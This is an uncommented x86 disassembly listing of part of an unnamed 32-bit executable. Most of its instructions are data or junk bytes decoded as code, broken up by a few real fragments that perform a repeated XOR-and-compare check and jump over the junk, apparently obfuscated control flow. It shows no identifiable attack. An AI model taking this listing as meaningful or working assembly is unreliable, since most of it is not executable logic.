  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	xor    DWORD PTR [esp+edx*2-0x2d],ebp
  40b50b:	call   0x38bf3400
  40b510:	jl     0x40b590
  40b512:	jle    0x40b504
  40b514:	fs fninit 
  40b517:	jne    0x40b54b
  40b519:	jg     0x40b586
  40b51b:	data16 js 0x40b51f
  40b51e:	add    dl,BYTE PTR [ebx+0x64]
  40b521:	ror    dh,0x55
  40b524:	ss ins BYTE PTR es:[edi],dx
  40b526:	call   0x6094:0xd9229952
  40b52d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b52e:	(bad)
  40b532:	rcl    DWORD PTR [esi],0x18
  40b535:	mov    edi,0xc472f2ea
  40b53a:	pusha  
  40b53b:	xor    BYTE PTR [ecx-0x7508c5d9],0xe
  40b542:	push   esi
  40b543:	xchg   DWORD PTR [ecx-0x5c6eb7e1],ebp
  40b549:	cld    
  40b54a:	xchg   edx,eax
  40b54b:	and    al,0xa2
  40b54d:	mov    ebp,0x87be3005
  40b552:	nop
  40b553:	inc    edx
  40b554:	push   ds
  40b555:	fiadd  DWORD PTR [edi]
  40b557:	fistp  QWORD PTR [esi+0x12bb173d]
  40b55d:	cs iret 
  40b55f:	clc    
  40b560:	icebp  
  40b561:	jle    0x40b4e8
  40b563:	mov    eax,0xf57afef1
  40b568:	xchg   edi,eax
  40b569:	ror    BYTE PTR [eax],1
  40b56b:	push   esp
  40b56c:	inc    eax
  40b56d:	inc    ebp
  40b56e:	add    eax,0xef8c2db
  40b573:	adc    eax,0xd1bce642
  40b578:	ffreep st(6)
  40b57a:	sub    al,0x4c
  40b57c:	push   ds
  40b57d:	and    al,0x64
  40b57f:	and    BYTE PTR [ebx],0x7f
  40b582:	jg     0x40b5db
  40b584:	ins    DWORD PTR es:[edi],dx
  40b585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b586:	dec    ebx
  40b587:	shr    BYTE PTR [esi],1
  40b589:	pusha  
  40b58a:	pushf  
  40b58b:	cli    
  40b58c:	in     al,dx
  40b58d:	inc    eax
  40b58e:	xor    BYTE PTR [ebx-0x16],bh
  40b591:	stc    
  40b592:	push   ecx
  40b593:	xor    eax,DWORD PTR [ebx]
  40b595:	adc    edx,ebp
  40b597:	cmp    esi,edx
  40b599:	sti    
  40b59a:	cmp    eax,0xee9927e1
  40b59f:	adc    bl,dh
  40b5a1:	jle    0x40b5a3
  40b5a3:	and    BYTE PTR [edi+ebx*2],cl
  40b5a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5a7:	pop    ebp
  40b5a8:	aam    0xae
  40b5aa:	and    al,0xbc
  40b5ac:	push   cs
  40b5ad:	xor    esi,eax
  40b5af:	loopne 0x40b567
  40b5b1:	inc    eax
  40b5b2:	scas   al,BYTE PTR es:[edi]
  40b5b3:	and    BYTE PTR es:[ebp-0x61],al
  40b5b7:	mov    BYTE PTR [edx-0x48],dh
  40b5ba:	add    BYTE PTR ds:0xa5e2620e,al
  40b5c0:	fcom   DWORD PTR [ecx-0x19877c0d]
  40b5c6:	or     DWORD PTR ds:0xbf4c4d99,esp
  40b5cc:	cmc    
  40b5cd:	pop    es
  40b5ce:	mov    bl,0xac
  40b5d0:	inc    ecx
  40b5d1:	addr16 ds xchg esi,eax
  40b5d4:	mov    eax,ds:0x73c9f83f
  40b5d9:	sub    DWORD PTR [ebx-0x72],ebp
  40b5dc:	std    
  40b5dd:	test   BYTE PTR [esp+ebx*2+0x24],al
  40b5e1:	shl    DWORD PTR [ebx-0x18940c91],0x77
  40b5e8:	in     al,0x5b
  40b5ea:	xchg   ecx,eax
  40b5eb:	stos   DWORD PTR es:[edi],eax
  40b5ec:	stos   DWORD PTR es:[edi],eax
  40b5ed:	popa   
  40b5ee:	mov    bh,0x6c
  40b5f0:	lods   al,BYTE PTR ds:[esi]
  40b5f1:	int3   
  40b5f2:	cmp    al,0x52
  40b5f4:	dec    ebx
  40b5f5:	xchg   edx,eax
  40b5f6:	out    0x3f,eax
  40b5f8:	(bad)  
  40b5f9:	cli    
  40b5fa:	loope  0x40b615
  40b5fc:	sbb    BYTE PTR [ebp+0x5834c100],ch
  40b602:	je     0x40b635
  40b604:	jecxz  0x40b656
  40b606:	cs popa 
  40b608:	stc    
  40b609:	push   es
  40b60a:	push   edx
  40b60b:	inc    eax
  40b60c:	fptan  
  40b60e:	test   DWORD PTR [ecx+0x206bd200],esp
  40b614:	jnp    0x40b637
  40b616:	iret   
  40b617:	or     DWORD PTR [ecx-0xd],esp
  40b61a:	cs call 0x834c:0x150d7d95
  40b622:	mov    eax,ds:0xfabdce68
  40b627:	adc    esi,DWORD PTR [ebx+0x51ece33b]
  40b62d:	inc    esi
  40b62e:	mov    edx,0x42683e2f
  40b633:	push   cs
  40b634:	lds    ebp,FWORD PTR cs:[ebx-0x4b]
  40b638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b639:	adc    al,0xc2
  40b63b:	test   edx,ebp
  40b63d:	int3   
  40b63e:	es xchg ecx,eax
  40b640:	(bad)  
  40b643:	loopne 0x40b68e
  40b645:	or     BYTE PTR [ebx+0x7b0ffb57],0xc
  40b64c:	mov    al,0x4f
  40b64e:	jmp    0x40b603
  40b650:	sti    
  40b651:	mov    edi,0xa8463ae3
  40b656:	cmp    ch,bl
  40b658:	call   0xd14c:0x10a529d8
  40b65f:	mov    ds:0xcd194e75,al
  40b664:	adc    DWORD PTR [edi-0x55a88cda],edx
  40b66a:	mov    eax,0x1a93cd40
  40b66f:	pop    esp
  40b670:	sbb    ah,BYTE PTR [ebx]
  40b672:	repz sbb bh,BYTE PTR [edi+ecx*1]
  40b676:	lods   al,BYTE PTR ds:[esi]
  40b677:	adc    dl,BYTE PTR [eax+0x7e32cd8d]
  40b67d:	scas   al,BYTE PTR es:[edi]
  40b67e:	popa   
  40b67f:	mov    cl,0xb9
  40b681:	mov    ah,BYTE PTR [edi-0x31c78bd3]
  40b687:	xchg   DWORD PTR [eax],edi
  40b689:	sub    eax,0xa1c2f713
  40b68e:	mov    bl,0xcc
  40b690:	lahf   
  40b691:	icebp  
  40b692:	dec    edx
  40b693:	and    DWORD PTR ds:0x97230380,ebp
  40b699:	data16 adc al,0x47
  40b69c:	xchg   esp,ecx
  40b69e:	xor    eax,0x268f2e3f
  40b6a3:	and    al,BYTE PTR [esi-0xd]
  40b6a6:	pop    esp
  40b6a7:	mov    dl,0x24
  40b6a9:	inc    eax
  40b6aa:	pop    esi
  40b6ab:	sar    dl,1
  40b6ad:	inc    ecx
  40b6ae:	inc    edx
  40b6af:	jo     0x40b651
  40b6b1:	mov    cl,0xf3
  40b6b3:	jae    0x40b6e3
  40b6b5:	inc    esi
  40b6b6:	icebp  
  40b6b7:	inc    ecx
  40b6b8:	aam    0xeb
  40b6ba:	xor    bh,BYTE PTR [edx+0x3b13c1ba]
  40b6c0:	adc    DWORD PTR [ebp-0x2a2d48bc],ebx
  40b6c6:	xor    BYTE PTR [bp+di],dh
  40b6c9:	loope  0x40b733
  40b6cb:	mov    edx,ebx
  40b6cd:	dec    esp
  40b6ce:	fcom   QWORD PTR [esi+0x4]
  40b6d1:	fsub   DWORD PTR [edx+0x3bf59cd4]
  40b6d7:	push   edx
  40b6d8:	ins    BYTE PTR es:[edi],dx
  40b6d9:	test   BYTE PTR [edx],0x14
  40b6dc:	pop    esi
  40b6dd:	test   bh,bl
  40b6df:	(bad)  
  40b6e0:	jb     0x40b6f0
  40b6e2:	sub    cl,BYTE PTR [eax]
  40b6e4:	mov    edi,0x14e6a170
  40b6e9:	push   eax
  40b6eb:	xchg   edx,eax
  40b6ec:	test   eax,0x834ec4b2
  40b6f1:	loope  0x40b73a
  40b6f3:	es int 0x4d
  40b6f6:	not    edx
  40b6f8:	mov    esp,0xda2686d2
  40b6fd:	jns    0x40b69d
  40b6ff:	pop    edi
  40b700:	inc    ecx
  40b701:	mov    esi,DWORD PTR [ebx+0x26]
  40b704:	lea    ebx,[esi]
  40b706:	das    
  40b707:	lahf   
  40b708:	mov    ch,0x7a
  40b70a:	mov    esp,0x7a6503c7
  40b70f:	inc    edx
  40b710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b711:	jg     0x40b6fd
  40b713:	mov    eax,0xa1ed9fd1
  40b718:	and    edx,DWORD PTR [edi+0x250edb7f]
  40b71e:	inc    ebp
  40b71f:	adc    eax,0x97419a19
  40b724:	cmp    esi,DWORD PTR [ebp+0x10]
  40b727:	les    ecx,FWORD PTR [edi]
  40b729:	sub    BYTE PTR [eax+ebx*8],dl
  40b72c:	push   0x564de7a0
  40b731:	sbb    DWORD PTR [eax],edx
  40b733:	das    
  40b734:	cs cmp eax,0xbfa90d
  40b73a:	stc    
  40b73b:	and    al,0xb1
  40b73d:	pusha  
  40b73e:	mov    ebp,0xf518e732
  40b743:	pop    ecx
  40b744:	push   esi
  40b745:	mov    ds:0xb4e64085,eax
  40b74a:	jb     0x40b7a2
  40b74c:	xchg   bh,dl
  40b74e:	cs jae 0x40b6f0
  40b751:	mov    bh,0x35
  40b753:	pop    edx
  40b754:	retf   
  40b755:	jmp    0xff8c2d3d
  40b75a:	jne    0x40b72c
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	in     al,0x44
  40b78c:	jno    0x40b7a9
  40b78e:	mov    dl,0xfe
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	daa    
  40b797:	push   0xce164f98
  40b79c:	sub    eax,0x2ee6428a
  40b7a1:	adc    eax,0xcb55359f
  40b7a6:	std    
  40b7a7:	or     BYTE PTR [edx+0x188fd93e],dh
  40b7ad:	adc    dh,bh
  40b7af:	push   ss
  40b7b0:	ficom  DWORD PTR [ebp+0x71]
  40b7b3:	xchg   esi,eax
  40b7b4:	lods   eax,DWORD PTR ds:[esi]
  40b7b5:	aaa    
  40b7b6:	pop    edx
  40b7b7:	mov    DWORD PTR [esp+edi*4],0xe0167a3
  40b7be:	lods   al,BYTE PTR ds:[esi]
  40b7bf:	shld   DWORD PTR [ecx-0x5cc0e83a],ebp,cl
  40b7c6:	adc    al,0xba
  40b7c8:	repz mov al,ds:0x1190c16
  40b7ce:	sbb    ebp,eax
  40b7d0:	jmp    0xa62bef04
  40b7d5:	sets   BYTE PTR [ebp+0x2f]
  40b7d9:	xchg   DWORD PTR [eax+eiz*8-0x1642f94],eax
  40b7e0:	mov    esp,DWORD PTR [edx+0x5079f890]
  40b7e6:	lea    esp,[esi]
  40b7e8:	int    0x58
  40b7ea:	(bad)  
  40b7eb:	adc    ebp,ebp
  40b7ed:	add    ah,BYTE PTR [eax+0x1ab39767]
  40b7f3:	xchg   ebx,eax
  40b7f4:	clc    
  40b7f5:	pop    edx
  40b7f6:	in     al,0xde
  40b7f8:	mov    ah,BYTE PTR [edi-0x50]
  40b7fb:	popf   
  40b7fc:	fcmove st,st(2)
  40b7fe:	xor    BYTE PTR [ecx+eiz*2+0x6f],bl
  40b802:	mov    ?,WORD PTR gs:[ebp-0x3529a452]
  40b809:	sbb    BYTE PTR [ecx+0x7],dl
  40b80c:	mov    ebp,0x1b2d810
  40b811:	int    0xe5
  40b813:	in     eax,dx
  40b814:	dec    edi
  40b815:	jecxz  0x40b837
  40b817:	pop    ecx
  40b818:	in     eax,dx
  40b819:	jne    0x40b81e
  40b81b:	push   esp
  40b81c:	outs   dx,DWORD PTR ds:[esi]
  40b81d:	push   ebx
  40b81e:	mov    WORD PTR [ebx],gs
  40b820:	dec    ebp
  40b821:	inc    ebx
  40b822:	out    dx,ax
  40b824:	jle    0x40b878
  40b826:	outs   dx,DWORD PTR es:[esi]
  40b828:	jne    0x40b7ea
  40b82a:	inc    edx
  40b82b:	pop    edx
  40b82c:	push   0xcff24fbd
  40b831:	fs sub al,0x49
  40b834:	repnz test DWORD PTR [esp+edx*2-0x5f],eax
  40b839:	sbb    DWORD PTR [edx],edx
  40b83b:	or     DWORD PTR ds:0x91a0a28c,ebp
  40b841:	repnz push edx
  40b843:	mov    edi,0xa6e3a685
  40b848:	jae    0x40b8c9
  40b84a:	(bad)  
  40b84b:	cmp    esp,DWORD PTR [eax-0x5f7ccdc0]
  40b851:	sbb    DWORD PTR [ebx-0x2c],edi
  40b854:	mov    bl,0xa5
  40b856:	pop    ecx
  40b857:	push   edx
  40b858:	or     eax,0xde4888f9
  40b85d:	mov    edx,0xb0f86a2
  40b862:	inc    ebx
  40b863:	xchg   edi,eax
  40b864:	(bad)  
  40b865:	mov    bl,0xf9
  40b867:	lds    ebx,FWORD PTR [ebp+0x37]
  40b86a:	mov    al,0x99
  40b86c:	mov    edx,0x20a48598
  40b871:	and    BYTE PTR [edi+0x1038c703],dh
  40b877:	cs montmul (bad)
  40b879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b87a:	sbb    DWORD PTR [edx-0x3fcb6929],0xc7a77f63
  40b884:	xor    BYTE PTR [ecx-0x5f506725],0x94
  40b88b:	aaa    
  40b88c:	ins    DWORD PTR es:[di],dx
  40b88e:	arpl   sp,bx
  40b890:	and    esi,DWORD PTR [esi+0xe]
  40b893:	inc    edx
  40b894:	into   
  40b895:	fld    DWORD PTR [eax]
  40b897:	xchg   ebp,eax
  40b898:	mov    ebx,0xa593bbd0
  40b89e:	cmp    DWORD PTR [esi],edx
  40b8a0:	jnp    0x40b863
  40b8a2:	push   esp
  40b8a3:	inc    ecx
  40b8a4:	test   BYTE PTR [edx+0x79298f85],ah
  40b8aa:	fwait
  40b8ab:	icebp  
  40b8ac:	xchg   esp,eax
  40b8ad:	imul   ecx,DWORD PTR [esi-0x7c3100f9],0x41d12dea
  40b8b7:	jge    0x40b871
  40b8b9:	(bad)  
  40b8ba:	push   ds
  40b8bb:	xchg   ebp,eax
  40b8bc:	push   esi
  40b8be:	inc    BYTE PTR [edx+0x50467c1f]
  40b8c4:	xor    eax,0xe1cf9cf2
  40b8c9:	mov    edi,DWORD PTR [esi-0x38]
  40b8cc:	in     eax,dx
  40b8cd:	sbb    ecx,DWORD PTR [esi+0x45]
  40b8d0:	jmp    0xa245:0x78d0bb51
  40b8d7:	xchg   edi,eax
  40b8d8:	add    al,0xc5
  40b8da:	add    eax,0x6c766e89
  40b8df:	or     ebx,DWORD PTR [eax]
  40b8e1:	sahf   
  40b8e2:	xchg   BYTE PTR [edx+0x52],dh
  40b8e5:	add    eax,0xfc6e3e4
  40b8ea:	jl     0x40b8c2
  40b8ec:	and    bh,BYTE PTR [ebp-0x5]
  40b8ef:	mov    ?,ebp
  40b8f1:	dec    ecx
  40b8f2:	in     al,dx
  40b8f3:	call   0xbc63c52f
  40b8f8:	in     eax,0xc
  40b8fa:	mov    dh,ch
  40b8fc:	pushf  
  40b8fd:	sub    BYTE PTR [ecx-0x33],0x32
  40b901:	sub    DWORD PTR [esi-0x2b81ff4b],esi
  40b907:	(bad)  [ebx+0x6106f548]
  40b90d:	arpl   WORD PTR [eax-0x4],si
  40b910:	js     0x40b971
  40b912:	fmul   QWORD PTR [eax]
  40b914:	mov    dl,0x3c
  40b916:	dec    edx
  40b917:	sbb    eax,0xc74f4a9f
  40b91c:	ror    dh,cl
  40b91e:	or     eax,DWORD PTR [edi+0x26]
  40b921:	sbb    ch,dh
  40b923:	sub    al,0xfe
  40b925:	inc    ecx
  40b926:	sbb    eax,0x78fe809f
  40b92b:	fbstp  TBYTE PTR [edx]
  40b92d:	mov    esp,0x2473d39f
  40b932:	(bad)  
  40b933:	aas    
  40b934:	in     eax,dx
  40b935:	ficom  DWORD PTR [edi-0x5b3e2d4d]
  40b93b:	sub    edx,esp
  40b93d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b93e:	ss sub al,0xbe
  40b941:	jne    0x40b915
  40b943:	add    eax,0xce3beea5
  40b948:	push   DWORD PTR [eax-0x40e23f1f]
  40b94e:	and    ecx,DWORD PTR [edx+eax*4-0x1e7f6017]
  40b955:	push   0xffffffa6
  40b957:	pop    eax
  40b958:	push   0x44c92550
  40b95d:	sbb    BYTE PTR [eax-0xbc96da5],ah
  40b963:	or     al,bh
  40b965:	push   esi
  40b966:	mov    bl,0x86
  40b968:	add    al,0x9b
  40b96a:	sbb    edx,DWORD PTR ds:0xd03d4a23
  40b970:	dec    ebp
  40b971:	enter  0xf50d,0x1f
  40b975:	dec    ebp
  40b976:	jmp    0xe9b5:0x84cdab6f
  40b97d:	fld    DWORD PTR [edi+0x6094823e]
  40b983:	pop    edx
  40b984:	sbb    dh,BYTE PTR [ecx]
  40b986:	pop    edi
  40b987:	nop
  40b988:	jle    0x40b9a0
  40b98a:	repnz push ecx
  40b98c:	push   es
  40b98d:	jg     0x40b95a
  40b98f:	or     al,0x8a
  40b991:	sbb    BYTE PTR [esi],cl
  40b993:	add    cl,BYTE PTR [ebx+0x10]
  40b996:	cld    
  40b997:	sbb    al,0xf3
  40b999:	aas    
  40b99a:	test   eax,0xc50f9514
  40b99f:	test   DWORD PTR [esi+edx*1-0x69],ebx
  40b9a3:	xchg   edx,eax
  40b9a4:	loope  0x40b97a
  40b9a6:	add    edi,DWORD PTR [edi-0x975f5a4]
  40b9ac:	cmp    esi,esi
  40b9ae:	aam    0x11
  40b9b0:	pop    ds
  40b9b1:	sahf   
  40b9b2:	jecxz  0x40b9c5
  40b9b4:	push   ds
  40b9b5:	(bad)  [esi+0x4e84e17]
  40b9bb:	mov    al,ds:0x4f01fbe0
  40b9c0:	add    cl,BYTE PTR [ebp-0x6f]
  40b9c3:	sub    eax,0x5680e95
  40b9c8:	sub    DWORD PTR [ebx+0x12],edx
  40b9cb:	call   0xc9d6:0xbabc9414
  40b9d2:	hlt    
  40b9d3:	fidiv  DWORD PTR ss:[edx-0x20185f47]
  40b9da:	jecxz  0x40b9ae
  40b9dc:	mov    eax,DWORD PTR [ebp-0x20]
  40b9df:	inc    edi
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0x170ca808],eax
  40ba0f:	gs pop esp
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	cwde   
  40ba1a:	outs   dx,DWORD PTR ds:[esi]
  40ba1b:	or     eax,0x8101bb18
  40ba20:	add    eax,0x9a557e93
  40ba25:	enter  0x7c0,0xff
  40ba29:	loop   0x40b9dd
  40ba2b:	(bad)  
  40ba2c:	lods   eax,DWORD PTR ds:[esi]
  40ba2d:	lods   eax,DWORD PTR ds:[esi]
  40ba2e:	pop    es
  40ba2f:	xor    ebx,DWORD PTR [ecx]
  40ba31:	and    ebp,DWORD PTR [ebx]
  40ba33:	out    0x24,al
  40ba35:	cs pop esp
  40ba37:	(bad)  
  40ba38:	xor    DWORD PTR ss:[eax+eiz*1-0x37],esp
  40ba3d:	xor    DWORD PTR [edi-0x21421c46],ebp
  40ba43:	xchg   ecx,eax
  40ba44:	mov    bh,al
  40ba46:	sub    DWORD PTR [ebp+0x173e463b],eax
  40ba4c:	rcr    BYTE PTR fs:[esp+ebx*2+0x161a7e6e],cl
  40ba54:	imul   eax,ebx,0x69
  40ba57:	(bad)  
  40ba5a:	xchg   BYTE PTR [esi+0x7a94a49d],bl
  40ba60:	and    DWORD PTR [edx+0x402b09e5],0x11a82d83
  40ba6a:	mov    ah,0x6f
  40ba6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6d:	mov    ebp,0x64e1b940
  40ba72:	xor    al,0xc2
  40ba74:	and    ah,BYTE PTR [ebp+0x9]
  40ba77:	push   cs
  40ba78:	jmp    0x19585b93
  40ba7d:	adc    eax,0xced23f65
  40ba82:	(bad)  
  40ba83:	sahf   
  40ba84:	and    BYTE PTR [ecx-0x7c],bh
  40ba87:	scas   al,BYTE PTR es:[edi]
  40ba88:	aas    
  40ba89:	xchg   ebx,eax
  40ba8a:	test   BYTE PTR [edx],bl
  40ba8c:	scas   eax,DWORD PTR es:[edi]
  40ba8d:	cdq    
  40ba8e:	jno    0x40baa9
  40ba90:	scas   eax,DWORD PTR es:[edi]
  40ba91:	dec    BYTE PTR [edi+0x29]
  40ba94:	push   ds
  40ba95:	and    al,0x40
  40ba97:	(bad)  
  40ba98:	cli    
  40ba99:	cmp    eax,0x69569ae1
  40ba9e:	pop    es
  40ba9f:	mov    ebp,0xc51469c9
  40baa4:	fwait
  40baa5:	gs std 
  40baa7:	fdivr  DWORD PTR [edx]
  40baa9:	fwait
  40baaa:	ror    DWORD PTR [ebx-0x5ca7f09e],cl
  40bab0:	dec    edi
  40bab1:	mov    ch,0x20
  40bab3:	dec    ebp
  40bab4:	jg     0x40baee
  40bab6:	dec    ebp
  40bab7:	push   0x67c91220
  40babc:	pop    esi
  40babd:	rcl    dl,cl
  40babf:	xor    al,0x42
  40bac1:	das    
  40bac2:	sbb    al,0xf9
  40bac4:	add    DWORD PTR [ebx],esi
  40bac6:	mov    WORD PTR [ecx-0x1c],cs
  40bac9:	push   0x3b
  40bacb:	fs mov edi,0x8aab4929
  40bad1:	(bad)  
  40bad2:	pop    esp
  40bad3:	jbe    0x40ba73
  40bad5:	sar    DWORD PTR [esi],1
  40bad7:	adc    BYTE PTR ds:0x69b061cc,0x26
  40bade:	sar    BYTE PTR [edx+0x61654501],0xff
  40bae5:	push   ss
  40bae6:	mov    ds:0xf190d555,al
  40baeb:	test   ch,al
  40baed:	jb     0x40bada
  40baef:	pop    ss
  40baf0:	rol    ebx,cl
  40baf2:	in     eax,0x5
  40baf4:	(bad)  
  40baf5:	repz cli 
  40baf7:	push   ss
  40baf8:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40bafa:	scas   eax,DWORD PTR es:[edi]
  40bafb:	out    0x20,al
  40bafd:	in     eax,dx
  40bafe:	mov    cl,0x15
  40bb00:	or     ch,0x5e
  40bb03:	sub    ebp,ebx
  40bb05:	ins    BYTE PTR es:[edi],dx
  40bb06:	ja     0x40bafd
  40bb08:	inc    esp
  40bb09:	push   ax
  40bb0b:	popf   
  40bb0c:	push   esi
  40bb0d:	add    ecx,edi
  40bb0f:	adc    al,0x7
  40bb11:	xor    ebx,ecx
  40bb13:	inc    edi
  40bb14:	cmp    eax,0xc784d8d2
  40bb19:	add    DWORD PTR [ecx+ebp*2-0x31],edx
  40bb1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb1e:	lock aad 0xe3
  40bb21:	mov    edi,0xe925df46
  40bb26:	adc    al,0x17
  40bb28:	jns    0x40bb0a
  40bb2a:	add    al,0xc1
  40bb2c:	push   esi
  40bb2d:	retf   0x8980
  40bb30:	xchg   ah,bl
  40bb32:	xchg   edx,eax
  40bb33:	push   ebx
  40bb34:	xchg   ebp,esp
  40bb36:	icebp  
  40bb37:	test   al,0x9
  40bb39:	pop    ecx
  40bb3a:	jg     0x40bb11
  40bb3c:	push   edi
  40bb3d:	aad    0xd0
  40bb3f:	push   ebx
  40bb40:	cpuid  
  40bb42:	cwde   
  40bb43:	into   
  40bb44:	in     eax,0xd2
  40bb46:	out    dx,al
  40bb47:	dec    eax
  40bb48:	xor    BYTE PTR [esi-0x8f70678],bh
  40bb4e:	jmp    0xcefc:0x57ea4db4
  40bb55:	aad    0xd3
  40bb57:	mov    WORD PTR [edx+0x7f0a2fd4],?
  40bb5d:	sbb    eax,0x5c4a8ebd
  40bb62:	js     0x40bbcd
  40bb64:	jb     0x40bbb7
  40bb66:	push   edi
  40bb67:	inc    esp
  40bb68:	sub    BYTE PTR [esi+0x707f8b52],0xcb
  40bb6f:	mov    ds:0xb92b03a9,eax
  40bb74:	mov    ds,WORD PTR [ebx]
  40bb76:	sbb    DWORD PTR [esi],edx
  40bb78:	push   0x3c
  40bb7a:	mov    bl,0x6b
  40bb7c:	xor    dl,ch
  40bb7e:	dec    edx
  40bb7f:	repz push ecx
  40bb81:	add    al,0x8a
  40bb83:	push   edi
  40bb84:	enter  0x71be,0xea
  40bb88:	lods   al,BYTE PTR ds:[esi]
  40bb89:	test   al,0x7
  40bb8b:	adc    DWORD PTR [ebp-0x5e335b45],esp
  40bb91:	(bad)  
  40bb92:	outs   dx,DWORD PTR ds:[esi]
  40bb93:	sub    esi,DWORD PTR [edx-0x1]
  40bb96:	daa    
  40bb97:	(bad)  
  40bb99:	cdq    
  40bb9a:	in     al,0xd
  40bb9c:	aaa    
  40bb9d:	imul   esp,DWORD PTR [esi],0x36
  40bba0:	aad    0x79
  40bba2:	cmp    BYTE PTR [edi],bh
  40bba4:	dec    eax
  40bba5:	cmc    
  40bba6:	stos   BYTE PTR es:[edi],al
  40bba7:	test   al,0x54
  40bba9:	js     0x40bbfa
  40bbab:	mov    al,0x81
  40bbad:	loope  0x40bbb5
  40bbaf:	sbb    eax,0x72335eb4
  40bbb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbb5:	shl    BYTE PTR [esi+0x26],0x8
  40bbb9:	enter  0x2d48,0xd8
  40bbbd:	(bad)  
  40bbbe:	sbb    ebx,DWORD PTR [ebx+0x27e7e3fd]
  40bbc4:	inc    BYTE PTR [ebx]
  40bbc6:	pop    ebp
  40bbc7:	iret   
  40bbc8:	shl    BYTE PTR [edi+0x2800a868],0x36
  40bbcf:	in     eax,dx
  40bbd0:	(bad)  
  40bbd1:	mov    dh,0x10
  40bbd3:	jmp    0x432feb0e
  40bbd8:	sbb    cl,al
  40bbda:	ds jo  0x40bc1e
  40bbdd:	imul   ebx,DWORD PTR [edx-0x14],0x3c8d9add
  40bbe4:	(bad)
  40bbe8:	daa    
  40bbe9:	jl     0x40bbab
  40bbeb:	js     0x40bba2
  40bbed:	mov    cl,0x4b
  40bbef:	and    ecx,esi
  40bbf1:	cmp    al,0x15
  40bbf3:	push   esp
  40bbf4:	sbb    BYTE PTR [eax-0xf],bh
  40bbf7:	int    0xc9
  40bbf9:	push   edi
  40bbfa:	fcmovb st,st(0)
  40bbfc:	mov    edx,0x5ae87aa5
  40bc01:	outs   dx,DWORD PTR ds:[esi]
  40bc02:	sti    
  40bc03:	aas    
  40bc04:	adc    BYTE PTR [esi],ah
  40bc06:	jae    0x40bc4a
  40bc08:	add    DWORD PTR [eax+0x539c9e46],0x4
  40bc0f:	out    dx,al
  40bc10:	add    DWORD PTR [eax+0x66],ebx
  40bc13:	cli    
  40bc14:	cmp    BYTE PTR [edx-0x5b7ae4e1],0x2d
  40bc1b:	mov    ?,WORD PTR ds:0xc8285c8d
  40bc21:	scas   al,BYTE PTR es:[edi]
  40bc22:	arpl   WORD PTR [ebp+eiz*1-0x41103d62],cx
  40bc29:	inc    ebx
  40bc2a:	lods   al,BYTE PTR ds:[esi]
  40bc2b:	fsubr  DWORD PTR [edx-0x42c16794]
  40bc31:	push   ebp
  40bc32:	pop    edx
  40bc33:	cmp    BYTE PTR [edi],bh
  40bc35:	cmp    ah,BYTE PTR [edi+0x5a]
  40bc38:	(bad)  
  40bc39:	fiadd  WORD PTR [ebp-0x560169ce]
  40bc3f:	mov    esp,0x920cb622
  40bc44:	loope  0x40bc6c
  40bc46:	mov    cl,0xf9
  40bc48:	dec    ebp
  40bc49:	add    BYTE PTR [ebx],bh
  40bc4b:	ret    0xa06d
  40bc4e:	(bad)  
  40bc50:	add    ebp,0xffffff83
  40bc53:	retf   
  40bc54:	aam    0x2c
  40bc56:	mov    ds:0xe4104f18,eax
  40bc5b:	test   al,0x52
  40bc5d:	jp     0x40bbfa
  40bc5f:	movzx  eax,WORD PTR [eax+edi*2]
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	mov    ds:0xc69f9f6d,eax
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
